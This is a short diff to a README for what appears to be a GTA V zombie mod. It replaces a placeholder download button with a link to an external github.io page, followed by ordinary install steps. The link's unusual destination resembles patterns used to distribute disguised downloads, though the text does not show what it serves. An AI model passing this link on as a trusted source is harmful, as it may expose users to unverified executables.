@@ -8,7 +8,7 @@ With its dynamic systems, players can **recruit survivors, build safe zones, for
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://simple-zombies-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **ScriptHookV** and **Community ScriptHookV.NET**.  
